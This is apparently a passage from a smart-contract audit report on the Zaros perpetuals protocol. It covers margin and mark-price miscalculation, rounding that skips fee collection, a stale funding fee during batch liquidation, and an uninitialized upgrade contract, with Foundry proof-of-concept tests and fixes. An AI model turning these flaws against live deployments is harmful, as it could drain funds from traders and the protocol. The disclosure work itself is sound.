        position.size = sd59x18(position.size).add(sizeDelta).intoInt256();
        skew = skew.add(sizeDelta);

        (UD60x18 correctInitialMarginUsdX18, UD60x18 correctMaintenanceMarginUsdX18, UD60x18 correctMarkPrice) = MockTradingAccount
            .getAccountMarginRequirementUsdAndUnrealizedPnlUsd(
                position,
                marketIdLiqudator,
                SD59x18_ZERO,
                skew
            );

        emit log_named_decimal_uint("used mark price:", usedMarkPrice.intoUint256(), 18);
        emit log_named_decimal_uint("correct mark price:", correctMarkPrice.intoUint256(), 18);
        // correctMarkPrice - usedMarkPrice = -1/2 * indexPrice * positionSize / skewScale
        int256 markPriceDiffEstimate =  int256(MockConstants.indexPrice * 1e18) * (- positionSize) / (2 * int256(MockConstants.skewScale));
        int256 actualDiff = int256(correctMarkPrice.intoUint256()) - int256(usedMarkPrice.intoUint256());
        assert(actualDiff == markPriceDiffEstimate);

        emit log_named_decimal_int("correctMarkPrice - usedMarkPrice:", actualDiff, 18);

        int256 initialMarginDiff = int256(correctInitialMarginUsdX18.intoUint256()) - int256(usedInitialMarginUsdX18.intoUint256());
        int256 maintenanceMarginDiff = int256(correctMaintenanceMarginUsdX18.intoUint256()) - int256(usedMaintenanceMarginUsdX18.intoUint256());
        
        emit log_named_decimal_int("correctInitialMargin - usedInitialMargin:", initialMarginDiff, 18);
        emit log_named_decimal_int("correctMaintenanceMargin - usedMaintenanceMargin:", maintenanceMarginDiff, 18);

        // correctMarkPrice - usedMarkPrice = -1/2 * indexPrice * positionSize / skewScale
        if (positionSize > 0) {
            // - correctMarkPrice < usedMarkPrice => 
            //      - correctInitialMargin < usedInitialMargin
            //      - correctMaintenanceMargin < usedMaintenanceMargin
            // As a result,
            // protocol uses a larger value than the actual for the margin requirement values.
            // - if user's margin balance
            // if correctInitialMargin < marginBalance < usedInitialMargin
            //      - protocol rejects a size increasing trade even though user has required initialMargin.
            // if correctMaintenanceMargin < marginBalance < usedMaintenanceMargin
            //      - protocol considers the account to be liquidatable even though its not and rejects
            //      - orders which reduce the position size.
            //      - The trader could have saved their account from becoming liquidatable.
            assert(correctMarkPrice.lt(usedMarkPrice));
            assert(correctInitialMarginUsdX18.lt(usedInitialMarginUsdX18));
            assert(correctMaintenanceMarginUsdX18.lt(usedMaintenanceMarginUsdX18));
        } else {
            // - correctMarkPrice > usedMarkPrice => 
            //      - correctInitialMargin > usedInitialMargin
            //      - correctMaintenanceMargin > usedMaintenanceMargin
            // As a result,
            // protocol uses a smaller value than the actual for the margin requirement values.
            // if correctInitialMargin > traderMarginBalance > usedInitialMargin
            //      - protocol accepts a size increasing trade when the trader is under initialMarginRequirement.
            // if correctMaintenanceMargin > traderMarginBalance > usedMaintenanceMargin
            //      - Protocol allows a liquidatable account to perform trades and close their positions.
            assert(correctMarkPrice.gt(usedMarkPrice));
            assert(correctInitialMarginUsdX18.gt(usedInitialMarginUsdX18));
            assert(correctMaintenanceMarginUsdX18.gt(usedMaintenanceMarginUsdX18));
        }
    }

    function test_incorrectMarginCalculation() external {
        int256 positionSizeNeg = -150e18;
        int256 sizeDeltaNeg = -50e18;
        
        int256 positionSizePos = 100e18;
        int256 sizeDeltaPos = 100e18;

        emit log("Test case 1 Position Size Negative: correct > used");
        emit log_named_decimal_int("positionSize:", positionSizeNeg, 18);
        emit log_named_decimal_int("sizeDelta:", sizeDeltaNeg, 18);
        assertGetAccountMargin(sizeDeltaNeg, positionSizeNeg);

        emit log("Test case 2 Position Size Positive: correct < used");
        emit log_named_decimal_int("positionSize:", positionSizePos, 18);
        emit log_named_decimal_int("sizeDelta:", sizeDeltaPos, 18);
        assertGetAccountMargin(sizeDeltaPos, positionSizePos);
    }
}
```

```Solidity
> forge test --match-contract AfterTradeMarginTest -vv --via-ir

Ran 1 test for test/unit/AfterTradeMargin.t.sol:AfterTradeMarginTest
[PASS] test_incorrectMarginCalculation() (gas: 41250)
Logs:
  Test case 1 Position Size Negative: correct > used
  positionSize:: -150.000000000000000000
  sizeDelta:: -50.000000000000000000
  used mark price:: 68816.279550000000000000
  correct mark price:: 68821.440900000000000000
  correctMarkPrice - usedMarkPrice:: 5.161350000000000000
  correctInitialMargin - usedInitialMargin:: 103.227000000000000000
  correctMaintenanceMargin - usedMaintenanceMargin:: 51.613500000000000000
  Test case 2 Position Size Positive: correct < used
  positionSize:: 100.000000000000000000
  sizeDelta:: 100.000000000000000000
  used mark price:: 68821.440900000000000000
  correct mark price:: 68818.000000000000000000
  correctMarkPrice - usedMarkPrice:: -3.440900000000000000
  correctInitialMargin - usedInitialMargin:: -68.818000000000000000
  correctMaintenanceMargin - usedMaintenanceMargin:: -34.409000000000000000
```

## Impact

* if `positionSize` > `0`:
  * if `correctInitialMargin` < `traderMarginBalance` < `usedInitialMargin`
    * protocol rejects a size increasing trade even though user has required initialMargin.
  * if `correctMaintenanceMargin` < `traderMarginBalance` < `usedMaintenanceMargin`
    * protocol considers the account to be liquidatable even though its not and rejects orders which reduce the position size.
    * The trader cannot save their account from becoming liquidatable.

* if `positionSize` < `0`:
  * if `correctInitialMargin` > `traderMarginBalance` > `usedInitialMargin`
    * protocol accepts a size increasing trade when the trader is under initialMarginRequirement.
  * if `correctMaintenanceMargin` > `traderMarginBalance` > `usedMaintenanceMargin`
    * Protocol allows a liquidatable account to perform trades and close their positions.

## Tools Used

Manual Review

## Recommendations

Add a function to `PerpMarket` library which takes `skew` as an argument and computes the `markPrice`. In the `getAccountMarginRequirementUsdAndUnrealizedPnlUsd` function use the added function with after the trade skew and correct position size to compute the `markPriceAfterTheTrade`. Use this `markPrice` to compute the notional value and margin requirements.

## <a id='M-08'></a>M-08. when fillOrder() , small pnl can cause orderFee/settlementFee to not be fully collected

_Submitted by [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x), [0x1982us](https://profiles.cyfrin.io/u/0x1982us). Selected submission by: [0x1982us](https://profiles.cyfrin.io/u/0x1982us)._      
            


## Summary

`withdrawMarginUsd()` uses `round down` to compute `requiredMarginInCollateralX18`

May result in `fillOrder()` part of `fee` not being collected

## Vulnerability Details

in `fillOrder()`
We will deduct 3 fees `settlementFee` , `orderFee` , `pnl`

`fillOrder()` -> `deductAccountMargin()`

```solidity
    function deductAccountMargin(
        Data storage self,
        FeeRecipients.Data memory feeRecipients,
        UD60x18 pnlUsdX18,
        UD60x18 settlementFeeUsdX18,
        UD60x18 orderFeeUsdX18
    )
...
        for (uint256 i; i < cachedCollateralLiquidationPriorityLength; i++) {
            if (settlementFeeUsdX18.gt(UD60x18_ZERO) && ctx.settlementFeeDeductedUsdX18.lt(settlementFeeUsdX18)) {
                // attempt to deduct from this collateral difference between settlement fee
                // and amount of settlement fee paid so far
                (ctx.withdrawnMarginUsdX18, ctx.isMissingMargin) = withdrawMarginUsd(
                    self,
                    collateralType,
                    ctx.marginCollateralPriceUsdX18,
                    settlementFeeUsdX18.sub(ctx.settlementFeeDeductedUsdX18),
                    feeRecipients.settlementFeeRecipient
                );

                // update amount of settlement fee paid so far by the amount
                // that was actually withdraw from this collateral
                ctx.settlementFeeDeductedUsdX18 = ctx.settlementFeeDeductedUsdX18.add(ctx.withdrawnMarginUsdX18);
            }

            // order fee logic same as settlement fee above
            if (orderFeeUsdX18.gt(UD60x18_ZERO) && ctx.orderFeeDeductedUsdX18.lt(orderFeeUsdX18)) {
                (ctx.withdrawnMarginUsdX18, ctx.isMissingMargin) = withdrawMarginUsd(
                    self,
                    collateralType,
                    ctx.marginCollateralPriceUsdX18,
                    orderFeeUsdX18.sub(ctx.orderFeeDeductedUsdX18),
                    feeRecipients.orderFeeRecipient
                );
                ctx.orderFeeDeductedUsdX18 = ctx.orderFeeDeductedUsdX18.add(ctx.withdrawnMarginUsdX18);
            }

            // pnl logic same as settlement & order fee above
            if (pnlUsdX18.gt(UD60x18_ZERO) && ctx.pnlDeductedUsdX18.lt(pnlUsdX18)) {
                (ctx.withdrawnMarginUsdX18, ctx.isMissingMargin) = withdrawMarginUsd(
                    self,
                    collateralType,
                    ctx.marginCollateralPriceUsdX18,
                    pnlUsdX18.sub(ctx.pnlDeductedUsdX18),
                    feeRecipients.marginCollateralRecipient
                );
                ctx.pnlDeductedUsdX18 = ctx.pnlDeductedUsdX18.add(ctx.withdrawnMarginUsdX18);
            }

            // if there is no missing margin then exit the loop
            // since all amounts have been deducted
@>          if (!ctx.isMissingMargin) {
                break;
            }
        }


    function withdrawMarginUsd(
        Data storage self,
        address collateralType,
        UD60x18 marginCollateralPriceUsdX18,
        UD60x18 amountUsdX18,
        address recipient
    )
        internal
        returns (UD60x18 withdrawnMarginUsdX18, bool isMissingMargin)
    {
        MarginCollateralConfiguration.Data storage marginCollateralConfiguration =
            MarginCollateralConfiguration.load(collateralType);

        UD60x18 marginCollateralBalanceX18 = getMarginCollateralBalance(self, collateralType);
@>      UD60x18 requiredMarginInCollateralX18 = amountUsdX18.div(marginCollateralPriceUsdX18);
        uint256 amountToTransfer;

@>      if (marginCollateralBalanceX18.gte(requiredMarginInCollateralX18)) {
            withdraw(self, collateralType, requiredMarginInCollateralX18);
            amountToTransfer =
                marginCollateralConfiguration.convertUd60x18ToTokenAmount(requiredMarginInCollateralX18);

            IERC20(collateralType).safeTransfer(recipient, amountToTransfer);

            withdrawnMarginUsdX18 = amountUsdX18;
            isMissingMargin = false;
        } else {
            withdraw(self, collateralType, marginCollateralBalanceX18);
            amountToTransfer = marginCollateralConfiguration.convertUd60x18ToTokenAmount(marginCollateralBalanceX18);

            IERC20(collateralType).safeTransfer(recipient, amountToTransfer);

            withdrawnMarginUsdX18 = marginCollateralPriceUsdX18.mul(marginCollateralBalanceX18);
            isMissingMargin = true;
        }
    }
```

The problem is this line: `UD60x18 requiredMarginInCollateralX18 = amountUsdX18.div(marginCollateralPriceUsdX18);`
This is using `round down` , which may cause `dust pnl` to change `isMissingMargin` to false, causing `break loop`.

Example.
The user has two collaterals
marginCollateralBalance = \[Collateral\_A = 1e18 usd , Collateral\_B= 2000e18 usd ]
settlementFee =100e18
orderFee=100e18
pnl = 9
marginCollateralPrice= 10e18

1. loop use Collateral\_A
   * 1.1 charge  settlementFee: withdrawMarginUsd(settlementFee=100e18)
     * marginCollateralBalanceX18 = 1e18
     * requiredMarginInCollateralX18 = 100e18 \* 1e18 / 10e18 = 10e18
     * isMissingMargin = true , Remaining = 99e18   --------------------> correct
   * 1.2 charge orderFee :withdrawMarginUsd(orderFee=100e18)
     * marginCollateralBalanceX18 = 0
     * requiredMarginInCollateralX18 = 100e18\* 1e18 / 10e18 = 10e18
     * so  isMissingMargin = true , Remaining = 100e18  --------------------> correct
   * 1.3  charge pnl: withdrawMarginUsd(pnl=9)
     * marginCollateralBalanceX18 = 0
     * requiredMarginInCollateralX18 = 9\* 1e18 / 10e18 = 0    ----------> \*\*\*\*\* round down  \*\*\*\*\*
     * so marginCollateralBalanceX18.gte(requiredMarginInCollateralX18) == true
     * so  isMissingMargin = false --------------------------------------> \*\*\*\* wrong \*\*\*\*\*
2. will loop Collateral\_B , but step 1.3 , isMissingMargin == false ,  so loop break

When charging a pnl, due to the use of `round down`
`requiredMarginInCollateralX18 = amountUsdX18.div(marginCollateralPriceUsdX18) = 9 * 1e18 / 10e18 ==0`

This caused the loop to jump out of the loop early by incorrectly overriding `isMissingMargin=false`.

miss fees: settlementFee = 99e18 + orderFee = 100e18

## Impact

dust pnl can cause orderFee/settlementFee to not be fully collected

## Tools Used

## Recommendations

use round up

```diff
    function withdrawMarginUsd(
        Data storage self,
        address collateralType,
        UD60x18 marginCollateralPriceUsdX18,
        UD60x18 amountUsdX18,
        address recipient
    )
        internal
        returns (UD60x18 withdrawnMarginUsdX18, bool isMissingMargin)
    {
        MarginCollateralConfiguration.Data storage marginCollateralConfiguration =
            MarginCollateralConfiguration.load(collateralType);

        UD60x18 marginCollateralBalanceX18 = getMarginCollateralBalance(self, collateralType);
-       UD60x18 requiredMarginInCollateralX18 = amountUsdX18.div(marginCollateralPriceUsdX18);
+       UD60x18 requiredMarginInCollateralX18 = amountUsdX18.divUp(marginCollateralPriceUsdX18);
```

## <a id='M-09'></a>M-09. Liquidating positions of different accounts for the same market on the same block.timestamp uses the same fundingFeePerUnit regardless of the computed MarkPrice based on the size of the position been liqudiated.

_Submitted by [0xstalin](https://profiles.cyfrin.io/u/0xstalin)._      
            


````markdown
## Summary
When liquidating multiple accounts in the same tx, the fundingFeePerUnit that will be used to compute the fundingFee is erroneously calculated for all the accounts starting from the 2nd liquidated account. 
- The fundingFeePerUnit of all the liquidated accounts will be the same fundingFeePerUnit as the one computed for the first liquidated account, regardless of the position size and mark price of each position being liquidated.

## Vulnerability Details
When liquidating accounts, it is possible to liquidate multiple accounts in the same tx, which means, the block.timestamp for all of these liquidations will be the same.

As part of the liquidation process, [the logic computes the funding fee that the position being liquidated has accrued](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/TradingAccount.sol#L280-L297), either positive or negative. This fundingFee is derived from the fundingFeePerUnit, which the fundingFeePerUnit is computed from the `lastFundingFeePerUnit` and the `pendingFundingFeePerUnit`.
- The `pendingFundingFeePerUnit` itself is derived from the average funding rate, the elapsed time since the last funding, and the current MarkPrice computed to reflect the change on the marked after closing the liquidated position.
  - The problem with the current way how the `pendingFundingFeePerUnit` is computed is that **when liquidating more than 1 account at the same time, the `pendingFundingFeePerUnit` for the 2nd and the rest of the accounts will be 0**, which means, ***the `fundingFeePerUnitX18` for all the positions to be liquidated will be the same as the computed `fundingFeePerUnitX18` of the 1st liquidated position.***
    - This is clearly wrong since each position can have a different size and a different MarkPrice, but, regardless of that, the `fundingFeePerUnitX18` would be the same for all the positions been liquidated.
      - This ends up causing the funding fee to be paid/earn is wrong.

Let's see where exactly the problem occurs, this is the execution trace call:
`LiquidationBranch.liquidateAccounts()` => `TradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd()` => `PerpetualMarket.getNextFundingFeePerUnit()`

- The nextFundingFeePerUnit is computed based on the current funding rate and the MarkPrice, which, the [currentFundingRate is computed](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/PerpMarket.sol#L126-L130) based on the lastFundingRate, the currentFundingVelocity and the elapsedTimeSinceLastFunding.
  - Here we encounter the first problem, **the fundingRate will be returned as the lastFundingRate, no matter the currentFundingVelocity.** ***The reason is that by multiplying currentFundingVelocity * elapsedTime, the result will be 0, because, elapsedTime is 0.***

```
function getCurrentFundingRate(Data storage self) internal view returns (SD59x18) {
    //@audit => For the 2nd and rest of positions been liquidated, currentFundingRate will be the lastFundingRate, regardless of the currentFundingVelocity.
    return sd59x18(self.lastFundingRate).add(
      //@audit => Multipltying currentFundingVelocity times 0 will return 0.
        getCurrentFundingVelocity(self).mul(getProportionalElapsedSinceLastFunding(self).intoSD59x18())
    );
}

function getProportionalElapsedSinceLastFunding(Data storage self) internal view returns (UD60x18) {
  //@audit => When liquidating multiple account, the lastFundingTime of the 2nd and the rest of positions in the same market will be `block.timestamp`, so, this will return 0
        //@audit => `block.timestamp - block.timestamp === 0`.
    return ud60x18Convert(block.timestamp - self.lastFundingTime).div(
        ud60x18Convert(Constants.PROPORTIONAL_FUNDING_PERIOD)
    );
}
```

- Now, [when computing the nextFeePerUnit](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/PerpMarket.sol#L227-L237), we'll see why the value for the 2nd and rest of positions will be the same as the one computed for the first position.
  - The nextFeePerUnit will be only the lastFundingFeePerUnit, because the pendingFeePerUnit will be computed as 0, for the same reason the funding rate is also computed as 0.

```
function getNextFundingFeePerUnit(
        Data storage self,
        SD59x18 fundingRate,
        UD60x18 markPriceX18
    )
        ...
    {
        //@audit => The returned value for the 2nd and rest of accounts will be `lastFundingFeePerUnit`. pendingFundingFeePerUnit will be 0
        return sd59x18(self.lastFundingFeePerUnit).add(getPendingFundingFeePerUnit(self, fundingRate, markPriceX18));
    }

function getPendingFundingFeePerUnit(
        Data storage self,
        SD59x18 fundingRate,
        UD60x18 markPriceX18
    )
        ...
    {

        SD59x18 avgFundingRate = unary(sd59x18(self.lastFundingRate).add(fundingRate)).div(sd59x18Convert(2));

        //@audit => getProportionalElapsedSinceLastFunding() will return 0, so, anything multiplied by 0 is 0.
        return avgFundingRate.mul(getProportionalElapsedSinceLastFunding(self).intoSD59x18()).mul(
            markPriceX18.intoSD59x18()
        );

        //@audit-issue => Regardless of the funding rate and mark price, the returned pendingFundingFeePerUnit will be 0!
    }
```

Finally, now that we've seen the fundingFeePerUnit would be the same for all the positions, regardless of their size, let's see how the fundingFeePerUnit impacts the actual funding fee to pay/earn.

```
function getAccountMarginRequirementUsdAndUnrealizedPnlUsd(
    Data storage self,
    uint128 targetMarketId,
    SD59x18 sizeDeltaX18
)
    ...
{
    ...


    for (uint256 i; i < cachedActiveMarketsIdsLength; i++) {
        ...

        // calculate price impact as if trader were to close the entire position
        UD60x18 markPrice = perpMarket.getMarkPrice(sd59x18(-position.size), perpMarket.getIndexPrice());

        //@audit-issue => fundingFeePerUnit for all the liquidated positions will be the same as the fundingFeePerUnit of the first liquidated position, regardless of the current funding rate and mark price of each of the positions been liquidated.
        // get funding fee per unit
        SD59x18 fundingFeePerUnit =
            perpMarket.getNextFundingFeePerUnit(perpMarket.getCurrentFundingRate(), markPrice);

       ...

        //@audit-issue => Using an incorrect fundingFeePerUnit will ends up computing a wrong accrued funding fee, which it will impact the calculation of the uPnL.
        // get unrealized pnl + accrued funding fees
        SD59x18 positionUnrealizedPnl =
            position.getUnrealizedPnl(markPrice).add(position.getAccruedFunding(fundingFeePerUnit));

        ...
    }
}
```

### Coded PoC
I coded a PoC to demonstrate the problem about all accounts been liquidated using the same fundingFeePerUnit.

We'll need to add a couple of console.log statements to the `TradingAccount.sol` and `LiquidationBranch.sol` files, so we can see the exact values when the functions are called.

First, help me to add the next lines on the [`TradingAccount.sol`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/TradingAccount.sol) file:
```
+ import { console2 } from "forge-std/Test.sol";

library TradingAccount {

  ...

  function getAccountUnrealizedPnlUsd(Data storage self) internal view returns (SD59x18 totalUnrealizedPnlUsdX18) {
      uint256 cachedActiveMarketsIdsLength = self.activeMarketsIds.length();

      for (uint256 i; i < cachedActiveMarketsIdsLength; i++) {
         ...

          SD59x18 fundingFeePerUnitX18 = perpMarket.getNextFundingFeePerUnit(fundingRateX18, markPriceX18);

+         console2.log("Data of MarketID: ", marketId);
+         console2.log("======> fundingFeePerUnitX18: ", fundingFeePerUnitX18.intoInt256());

         ...
      }
  }

  ...

  function getAccountMarginRequirementUsdAndUnrealizedPnlUsd(
        Data storage self,
        uint128 targetMarketId,
        SD59x18 sizeDeltaX18
    )
        ...
    {
        ...

        for (uint256 i; i < cachedActiveMarketsIdsLength; i++) {
            ...

            // get funding fee per unit
            SD59x18 fundingFeePerUnit =
                perpMarket.getNextFundingFeePerUnit(perpMarket.getCurrentFundingRate(), markPrice);

+           console2.log("Values while liquidating in Market ID: ", perpMarket.id);
+           console2.log("======> fundingFeePerUnit: ", fundingFeePerUnit.intoInt256());

            ...
        }
    }

}

```

Now, help me to add the next lines on the [`LiquidationBranch.sol`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/LiquidationBranch.sol) file:
```
+ import { console2 } from "forge-std/Test.sol";

contract LiquidationBranch {

  ...

  function liquidateAccounts(uint128[] calldata accountsIds) external {
      ...
      for (uint256 i; i < accountsIds.length; i++) {
        console2.log("===============================================");
        // store current accountId being liquidated in working data
        ctx.tradingAccountId = accountsIds[i];

+       console2.log("  Liquidation data of account: ", ctx.tradingAccountId);

        ...
        ...
        ...
      }
    }

  ...
}

```

Finally, let's add the below PoC to the [`liquidateAccounts.t.sol`](https://github.com/Cyfrin/2024-07-zaros/blob/main/test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol) test file:

```
// Make sure to add the console2 log dependency at the very top
import { console2 } from "forge-std/Test.sol";

contract LiquidateAccounts_Integration_Test is Base_Test {
  ...

  //PoC
  function test_sameFundingFeeForOperationOnSameBlockTimestampPoC()
      external
      givenTheSenderIsARegisteredLiquidator
      whenTheAccountsIdsArrayIsNotEmpty
      givenAllAccountsExist
  {
      uint256 marketId = 3;
      uint256 secondMarketId = 5;
      bool isLong = true;
      uint256 timeDelta = 1 weeks;

      TestFuzz_GivenThereAreLiquidatableAccountsInTheArray_Context memory ctx;

      ctx.fuzzMarketConfig = getFuzzMarketConfig(marketId);
      ctx.secondMarketConfig = getFuzzMarketConfig(secondMarketId);

      vm.assume(ctx.fuzzMarketConfig.marketId != ctx.secondMarketConfig.marketId);

      uint256 amountOfTradingAccounts = 2;

      ctx.marginValueUsd = 10_000e18 / amountOfTradingAccounts;
      ctx.initialMarginRate = ctx.fuzzMarketConfig.imr;

      deal({ token: address(usdz), to: users.naruto.account, give: ctx.marginValueUsd });

      // last account id == 0
      ctx.accountsIds = new uint128[](amountOfTradingAccounts);

      ctx.accountMarginValueUsd = ctx.marginValueUsd / (amountOfTradingAccounts + 1);

      //@audit => Open two positions on two different markets for Account1
      {
          ctx.tradingAccountId = createAccountAndDeposit(ctx.accountMarginValueUsd, address(usdz));

          openPosition(
              ctx.fuzzMarketConfig,
              ctx.tradingAccountId,
              ctx.initialMarginRate,
              ctx.accountMarginValueUsd / 2,
              isLong
          );

          openPosition(
              ctx.secondMarketConfig,
              ctx.tradingAccountId,
              ctx.secondMarketConfig.imr,
              ctx.accountMarginValueUsd / 2,
              isLong
          );

          ctx.accountsIds[0] = ctx.tradingAccountId;

          deal({ token: address(usdz), to: users.naruto.account, give: ctx.marginValueUsd });
      }

      //@audit => Open two positions on two different markets for Account2
      //@audit => The size of these positions is twice as big as the size of the positions of the account1!
      {
          ctx.tradingAccountId = createAccountAndDeposit(ctx.accountMarginValueUsd * 2, address(usdz));

          openPosition(
              ctx.fuzzMarketConfig,
              ctx.tradingAccountId,
              ctx.initialMarginRate,
              ctx.accountMarginValueUsd,
              isLong
          );

          openPosition(
              ctx.secondMarketConfig,
              ctx.tradingAccountId,
              ctx.secondMarketConfig.imr,
              ctx.accountMarginValueUsd,
              isLong
          );

          ctx.accountsIds[1] = ctx.tradingAccountId;

          deal({ token: address(usdz), to: users.naruto.account, give: ctx.marginValueUsd});
      }


      setAccountsAsLiquidatable(ctx.fuzzMarketConfig, isLong);
      setAccountsAsLiquidatable(ctx.secondMarketConfig, isLong);


      changePrank({ msgSender: liquidationKeeper });

      skip(timeDelta);

      SD59x18 totalUnrealizedPnlUsdX18;

      console2.log("===============================================");
      console2.log("=========== Start of PoC Output ===============");
      console2.log("===============================================");

      //@audit => when getAccountTotalUnrealizedPnl() is called, the fundingFeePerUnit of each position will be shown on the console (Before liquidating)

      console2.log("          Data for Naruto user / Account 1");
      totalUnrealizedPnlUsdX18 = perpsEngine.getAccountTotalUnrealizedPnl(ctx.accountsIds[0]);
      //console2.log("totalUnrealizedPnlUsdX18: ", totalUnrealizedPnlUsdX18.intoInt256());

      console2.log("===============================================");
      console2.log("          Data for Sasuke user / Account 2");
      totalUnrealizedPnlUsdX18 = perpsEngine.getAccountTotalUnrealizedPnl(ctx.accountsIds[1]);
      //console2.log("totalUnrealizedPnlUsdX18: ", totalUnrealizedPnlUsdX18.intoInt256());


      console2.log("===============================================");
      //@audit => when liquidateAccounts() is called, the fundingFeePerUnit of each position will be shown on the console (during the liquidation)
      perpsEngine.liquidateAccounts(ctx.accountsIds);

      console2.log("===============================================");
      console2.log("============ End of PoC Output ===============");
      console2.log("===============================================");
  }

}
```

Run the Poc with the command `forge test --match-test test_sameFundingFeeForOperationOnSameBlockTimestampPoC -vvv`, and let's analyze the output:
- As we can see, while the accounts are been liquidated, the fundingFeePerUnit of the two accounts is the same, regardless of the difference in the position size and the mark price.
```
  ===============================================
  =========== Start of PoC Output ===============
  ===============================================
  //@audit => Data before running the liquidation!
            Data for Naruto user / Account 1
  Data of MarketID:  3
  //@audit => fundingFeePerUnit of account1 on Market3 will be the same fundingFeePerUnit for all the liquidated accounts
  ======> fundingFeePerUnitX18:  -30419422517522

  Data of MarketID:  5
  //@audit => fundingFeePerUnit of account1 on Market5 will be the same fundingFeePerUnit for all the liquidated accounts
  ======> fundingFeePerUnitX18:  -26240866280127
  ===============================================
            Data for Sasuke user / Account 2
  //@audit => This is the fundingFeePerUnit that should be used when liquidating account2, but instead, it will use the fundingFeePerUnit of account1

  Data of MarketID:  3
  ======> fundingFeePerUnitX18:  -30419400850761

  Data of MarketID:  5
  ======> fundingFeePerUnitX18:  -26240866002832
  ===============================================
  ===============================================
  //@audit => Data while liquidating the accounts
    Liquidation data of account:  1
  Values while liquidating in Market ID:  3
  ======> fundingFeePerUnit:  -30419422517522

  Values while liquidating in Market ID:  5
  ======> fundingFeePerUnit:  -26240866280127
  ===============================================
    Liquidation data of account:  2
  Values while liquidating in Market ID:  3
  //@audit => Same fundingFeePerUnit as the account1 in Market3 regardless of the difference in size and mark price
  ======> fundingFeePerUnit:  -30419422517522

  //@audit => Same fundingFeePerUnit as the account1 in Market5 regardless of the difference in size and mark price
  Values while liquidating in Market ID:  5
  ======> fundingFeePerUnit:  -26240866280127   
  ===============================================
  ============ End of PoC Output ===============
  ===============================================

```

## Impact
The funding fee of the liquidated accounts starting from the 2nd one will be computed wrong because the fundingFeePerUnit that will be used is not the actual value for each position, instead, all the liquidations will use the fundingFeePerUnit that was computed for the first liquidated position.

## Tools Used
Manual Audit & Foundry

## Recommendations
I'd recommend adding a conditional on the [`PerpetualMarket.getProportionalElapsedSinceLastFunding() function`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/PerpMarket.sol#L261-L265) to handle the case when the elapsed time is 0, and instead of returning 0, return a fixed constant that would allow the computation of pendingFundingFeePerUnit and currentFundingRate.

The idea is to have a mechanism that can allow to execute multiple operations on the same block.timestamp without that causing problems when computing values dependent on the elapsed time.

```
function getProportionalElapsedSinceLastFunding(Data storage self) internal view returns (UD60x18) {
+   if (block.timestamp == self.lastFundingTime) {
+     return a fixed value to allow the computation of pendingFundingFee and currentFundingRate.
+   }

    //@audit-ok => If lastFundingTime is != block.timestamp, this formula works fine!
    return ud60x18Convert(block.timestamp - self.lastFundingTime).div(
        ud60x18Convert(Constants.PROPORTIONAL_FUNDING_PERIOD)
    );
}
```
````


# Low Risk Findings

## <a id='L-01'></a>L-01. QA Report - 0xStalin - Low Severities

_Submitted by [Panthers](https://codehawks.cyfrin.io/team/clyq3gq8c0001z8dg8uaaygxi), [samuraii77](https://profiles.cyfrin.io/u/samuraii77), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [shahilhussain](https://profiles.cyfrin.io/u/shahilhussain), [crunter](https://profiles.cyfrin.io/u/crunter), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [0xstalin](https://profiles.cyfrin.io/u/0xstalin), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [draiakoo](https://profiles.cyfrin.io/u/draiakoo). Selected submission by: [0xstalin](https://profiles.cyfrin.io/u/0xstalin)._      
            


````markdown
# L-01
## Title
Not validating if the report pulled from the DataStream has expired

## Vulnerability Details
The [Chainlink DataStreams](https://docs.chain.link/data-streams/tutorials/streams-direct/streams-direct-onchain-verification#examine-the-code) returns data encoded as bytes. There is a parameter called [`expiresAt`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/external/chainlink/interfaces/IStreamsLookupCompatible.sol#L23) that determines the latest timestamp where the report can be verified onchain. But, the [`SettlementConfiguration.requireDataStreamsReportIsValid() function`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/SettlementConfiguration.sol#L87-L103) doesn't use it to validate if the report has expired or not.


## Impact
Perpetual Markets may work with expired data.

## Tools Used
Manual Audit

## Recommendations
Validate if the report has expired or not.

```
function requireDataStreamsReportIsValid(
    bytes32 streamId,
    bytes memory verifiedReportData,
    uint256 maxVerificationDelay
)
    internal
    view
{
    PremiumReport memory premiumReport = abi.decode(verifiedReportData, (PremiumReport));

    if (
        streamId != premiumReport.feedId
            || block.timestamp > premiumReport.validFromTimestamp + maxVerificationDelay
+           || block.timestamp >= premiumReport.expiresAt
    ) {
        revert Errors.InvalidDataStreamReport(streamId, premiumReport.feedId);
    }
}
```

------
# L-02
## Title
Not disabling initializer on the UpgradeBranch contract

## Vulnerability Details
uninitialized implementation [UpgradeBranch contract](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/tree-proxy/branches/UpgradeBranch.sol) can be taken over by an attacker with initialize function, it’s recommended to invoke the _disableInitializers function in the constructor to prevent the implementation contract from being used by the attacker.


## Impact
Attacker could take over the ownership of the UpgradeBranch contract before it is initialized.

## Tools Used
Manual Audit & [Solodit Report](https://solodit.xyz/issues/no-protection-of-uninitialized-implementation-contracts-from-attacker-fixed-consensys-none-leequid-staking-markdown)

## Recommendations
Invoke _disableInitializers() in the constructors of the UpgradeBranch contract

------
# L-03
## Title
Traders can't set different referralCodes for each of their trading accounts.

## Vulnerability Details
When a TradingAccount is created, the owner is allowed to set a referral code or use a customReferralCode that will be associated to a specific address.
The problem is that [the Referral.Data is loaded based on the `msg.sender`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/TradingAccountBranch.sol#L254-L277), or in other words, the referral data is stored per Trader, instead of being stored per Account.

This means, Traders are forced to use the same referral code across all of their accounts.

```
    function createTradingAccount(
        bytes memory referralCode,
        bool isCustomReferralCode
    )
        public
        virtual
        returns (uint128 tradingAccountId)
    {
        ...

        //@audit-issue => The referral data is loaded based on the msg.sender.
